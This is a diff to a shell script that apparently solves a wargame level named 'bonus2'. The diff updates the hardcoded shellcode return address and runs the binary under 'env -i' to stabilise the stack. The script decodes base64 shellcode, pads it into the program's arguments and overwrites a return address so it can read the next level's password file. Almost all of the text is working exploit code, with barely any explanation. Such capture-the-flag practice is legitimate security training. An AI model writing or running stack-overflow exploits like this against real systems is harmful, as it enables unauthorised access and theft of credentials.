@@ -22,7 +22,7 @@ SHELLCODE="$(echo ${SHELLCODE_BASE64} | base64 --decode)"
 SHELLCODE_SIZE=$(printf "${SHELLCODE}" | wc -c)
 
 # We set 'argv[1]' to our shellcode and fill it to reach 40 bytes
-SHELLCODE_ADDRESS="bffff670"
+SHELLCODE_ADDRESS="bffffdb0"
 ARG1_SIZE=40
 ARG1_FILLER_SIZE="$(compute "${ARG1_SIZE} - ${SHELLCODE_SIZE}")"
 ARG1_FILLER="$(put "${ARG1_FILLER_SIZE}" "A")"
@@ -37,7 +37,7 @@ ARG2_FILLER="$(put "${ARG2_FILLER_SIZE}" "A")"
 ARG2="${ARG2_FILLER}${GREETUSER_RETURN_ADDRESS_REPLACEMENT}"
 
 # We run our exploit
-LANG="nl" ./bonus2 "${ARG1}" "${ARG2}"
+env -i LANG="nl" ./bonus2 "${ARG1}" "${ARG2}"
 
 # We use the reverse shell to retrieve the password
 # $> cat /home/user/bonus3/.pass
